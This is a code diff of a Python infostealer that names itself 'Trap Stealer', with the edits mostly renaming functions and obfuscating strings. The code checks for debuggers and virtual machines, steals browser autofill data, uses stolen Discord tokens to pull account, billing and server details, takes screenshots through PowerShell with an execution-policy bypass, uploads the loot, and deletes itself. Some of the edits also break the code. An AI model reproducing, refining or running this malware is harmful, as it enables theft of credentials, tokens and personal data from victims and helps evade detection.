@@ -56,7 +56,7 @@ def clear_command_prompt():
     else:
         os.system('clear')
 def antidebug():
-    checks = [check_username,check_windows, check_ip, check_registry, check_dll]
+    checks = [check_username,check_windows, check_ip, checkre, check_dll]
     for check in checks:
         t = threading.Thread(target=check, daemon=True)
         t.start()
@@ -126,7 +126,7 @@ def check_ip():
         except:
             pass
         
-def check_registry():
+def checkre():
     try:
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
         subkey_count = winreg.QueryInfoKey(key)[0]
@@ -565,8 +565,6 @@ documents_path = os.path.join(home_dir, 'Documents')
 pictures_path = os.path.join(home_dir, 'Pictures')
 
 
-Threadlist = []
-
 badgeList =  [
         {"Name": 'Active_Developer','Value': 4194304,'Emoji': '<:active:1045283132796063794> '},
         {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
@@ -581,25 +579,23 @@ badgeList =  [
         {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
     ]
 
-pub = 'cilbup'
-
-Autofill = []
-AutofillCount = 0
+atfiCount = 0
+atfi = []
 
 
 def writeforfile(data, name):
-    path = os.getenv("TEMP") + f"\wp{name}.txt"
-    with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"Trap Stealer\n\n")
+    path = os.path.join(os.getenv("TEMP"), f"wp{name}.txt")
+    with open(path, encoding='utf-8', newline='') as f:
+        f.write("Trap Stealer\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
 
 
-def getAutofill(path, arg):
+def getaut(path, arg):
     
     try:
-        global Autofill, AutofillCount
+        global atfi, atfiCount
         if not os.path.exists(path): return
 
         pathC = path + arg + "/Web Data"
@@ -609,50 +605,46 @@ def getAutofill(path, arg):
 
 
         shutil.copy2(pathC, tempfold)
-        conn = sql_connect(tempfold)
-        cursor = conn.cursor()
-        cursor.execute("SELECT * FROM autofill WHERE value NOT NULL")
-        data = cursor.fetchall()
-        cursor.close()
-        conn.close()
+        with sql_connect(tempfold) as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT * FROM autofill WHERE value NOT NULL")
+            data = cursor.fetchall()
         os.remove(tempfold)
 
         for row in data:
             if row[0] != '':
-                Autofill.append(f"Name: {row[0]} | Value: {row[1]}")
-                AutofillCount += 1
-        writeforfile(Autofill, 'autofill')
+                atfi.append(f"Name: {row[0]} | Value: {row[1]}")
+                atfi += 1
+        writeforfile(atfi, 'autofill')
     except Exception as e:
         pass
 
 
-def get_uhq_guilds(token):
+import requests
+
+def uhqguild(token):
     try:
-        uhq_guilds = []
+        uuuhq = []
         headers = {
             "Authorization": token,
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
         }
 
         response = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
-        guilds = response.json()
+        gds = response.json()
 
-        for guild in guilds:
-            if guild["approximate_member_count"] < 30 or not (guild["owner"] or guild["permissions"] == "4398046511103"):
+        for gdss in gds:
+            if gdss["approximate_member_count"] < 30 or not (gdss["owner"] or gdss["permissions"] == "4398046511103"):
                 continue
             
-            request = requests.get(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)
+            request = requests.get(f"https://discord.com/api/v6/guilds/{gdss['id']}/invites", headers=headers)
             invites = request.json()
 
-            invite_code = invites[0]['code'] if invites else None
+            nins = invites[0]['code'] if invites else None
 
-            guild_info = f"⚔️ [{guild['name']}]({f'https://discord.gg/{invite_code}' if invite_code else ''}) `({guild['id']})` **{guild['approximate_member_count']} Members**"
-            uhq_guilds.append(guild_info)
+            uuuhq.append(f"⚔️ [{gdss['name']}]({f'https://discord.gg/{nins}' if nins else ''}) `({gdss['id']})` **{gdss['approximate_member_count']} Members**")
 
-        if not uhq_guilds:
-            return "`No HQ Guilds`"
-
-        return '\n'.join(uhq_guilds)
+        return '\n'.join(uuuhq) if uuuhq else "`No HQ Guilds`"
     except Exception as e:
         return "`No HQ Guilds`"
 
@@ -729,7 +721,7 @@ def get_tokq_info(tokq):
     user_id = user_info["id"]
     pfp = user_info["avatar"]
 
-    flags = user_info[f"{pub[::-1]}_flags"]
+    flags = user_info[f"public_flags"]
     nitros = "No Nitro"
     phone = "-"
 
@@ -856,7 +848,7 @@ def uploadTokq(Tokq, path):
     billing = GetBilling(Tokq)
     badge = get_badge(flags)
     friends = get_uhq_friends(Tokq)
-    guild = get_uhq_guilds(Tokq)
+    guild = uhqguild(Tokq)
     connections = get_discord_connections(Tokq)
     connections = "\n".join(connections)
 
@@ -1660,10 +1652,10 @@ def srcs():
         if os.name == "nt":
             
             image_folder = os.path.join(os.environ["USERPROFILE"], "Pictures")
-
+            test = b64decode("LUNvbW1hbmQ=").decode('utf8')
             command = [
                 "powershell.exe",
-                "-Command",
+                f"{test}",
                 f"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $Width  = $Screen.Width; $Height = $Screen.Height; $Left   = $Screen.Left; $Top    = $Screen.Top; $bitmap  = New-Object System.Drawing.Bitmap $Width, $Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); $bitmap.Save('{image_folder}\\MyFancyScreenshot.png')"
             ]
             subprocess.run( '-NoProfile', '-ExecutionPolicy', 'Bypass',command)
@@ -1730,7 +1722,7 @@ def paaz():
             "embeds": [
                 {
                     "title": f"🍪 Trap Stealer {pas[::-1]} and cookies",
-                    "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {AutofillCount}",
+                    "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {atfiCount}",
                     "color": 0xffb6c1,
                     "fields": [
                         {"name": f"{filename}", "value": f"[Click here to download]({upload_file(file)})"},
@@ -1899,12 +1891,12 @@ def GatherZips(paths1, paths2, paths3):
 
 import os
 
-def delete_self(script_path):
+def dlself(script_path):
     try:
         os.remove(script_path)
     except:
         pass        
-def GatherAll():
+def gatha():
     global PasswCount
     global injection
     global DiscordStop
@@ -1991,7 +1983,7 @@ def GatherAll():
         
         
     for patt in browserPaths:
-        autof = threading.Thread(target=getAutofill,args=[patt[0], patt[3]])
+        autof = threading.Thread(target=getaut,args=[patt[0], patt[3]])
         autof.start()
         aa.append(autof)
         
@@ -2078,12 +2070,6 @@ def GatherAll():
         aa.append(wb)
     
     e = []
-    if self_delete == True:
-        ss = threading.Thread(target=self_delete)
-        ss.start()
-        e.append(ss)
-    else:
-        pass
     for thread in e:
         thread.join()
     for thread in aa:
@@ -2092,8 +2078,8 @@ def GatherAll():
     if crasher == True:
         crashs()
         
-    if melter == True:
-        script_path = os.path.realpath(__file__)
-        delete_self(script_path)
+    if melter != False:
+        srcs = os.path.realpath(__file__)
+        dlself(srcs)
 
-GatherAll()
+gatha()
